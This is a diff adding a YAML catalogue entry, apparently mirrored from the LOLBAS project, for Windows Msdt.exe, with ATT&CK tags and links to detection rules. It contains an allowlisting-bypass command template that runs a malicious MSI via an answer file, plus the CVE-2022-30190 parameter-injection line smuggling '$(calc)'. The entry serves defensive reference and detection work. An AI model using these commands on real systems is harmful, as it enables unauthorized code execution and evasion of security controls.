@@ -1,0 +1,120 @@
+id: lolbas/T1NCaW5hcmllcy9Nc2R0LnltbA/QVdMIEJ5cGFzcw/1
+type: binary
+platform: windows
+name: Msdt.exe
+phases:
+- defense-evasion
+- execution
+capabilities:
+- defense-evasion
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1218
+opsec:
+  noise: medium
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_msdt_answer_file.yml
+  - https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msdt_arbitrary_command_execution.yml
+  - https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
+commands:
+- template: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip
+    TRUE
+  comment: Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml
+    file.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Msdt/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Msdt.exe
+      category: AWL Bypass
+      privileges: User
+      mitre_id: T1218
+      source_file: OSBinaries/Msdt.yml
+      command_source_index: 1
+      document_utf8: "---\nName: Msdt.exe\nDescription: Microsoft diagnostics tool\nAuthor: Oddvar Moe\n\
+        Created: 2018-05-25\nCommands:\n  - Command: msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\\
+        PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE\n    Description: Executes the Microsoft\
+        \ Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.\n    Usecase:\
+        \ Execute code\n    Category: Execute\n    Privileges: User\n    MitreID: T1218\n    OperatingSystem:\
+        \ Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      -\
+        \ Application: GUI\n      - Execute: MSI\n  - Command: msdt.exe -path C:\\WINDOWS\\diagnostics\\\
+        index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE\n    Description: Executes the Microsoft\
+        \ Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.\n    Usecase:\
+        \ Execute code bypass Application whitelisting\n    Category: AWL Bypass\n    Privileges: User\n\
+        \    MitreID: T1218\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows\
+        \ 10, Windows 11\n    Tags:\n      - Application: GUI\n      - Execute: MSI\n  - Command: msdt.exe\
+        \ /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"\
+        \n    Description: Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging\
+        \ the \"PCWDiagnostic\" module (CVE-2022-30190). Note that this specific technique will not work\
+        \ on a patched system with the June 2022 Windows Security update.\n    Usecase: Execute code bypass\
+        \ Application allowlisting\n    Category: AWL Bypass\n    Privileges: User\n    MitreID: T1202\n\
+        \    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n\
+        \    Tags:\n      - Application: GUI\n      - Execute: CMD\nFull_Path:\n  - Path: C:\\Windows\\\
+        System32\\Msdt.exe\n  - Path: C:\\Windows\\SysWOW64\\Msdt.exe\nCode_Sample:\n  - Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/PCW8E57.xml\n\
+        Detection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_msdt_answer_file.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msdt_arbitrary_command_execution.yml\n\
+        \  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml\n\
+        Resources:\n  - Link: https://web.archive.org/web/20160322142537/https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/\n\
+        \  - Link: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/\n\
+        \  - Link: https://twitter.com/harr0ey/status/991338229952598016\n  - Link: https://twitter.com/nas_bench/status/1531944240271568896\n\
+        Acknowledgement:\n  - Person: Nasreddine Bencherchali\n    Handle: '@nas_bench'\n"
+      document_sha256: sha256:36f6306981def275737921c28ca3f6f6a3568350506b8df15780296d5da2d566
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Msdt/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: defense-evasion
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: defense-evasion
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1218
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:c08ab21914acc2c877d3a164a739f51043e3cd7907a8fc3673deac2c962296dd
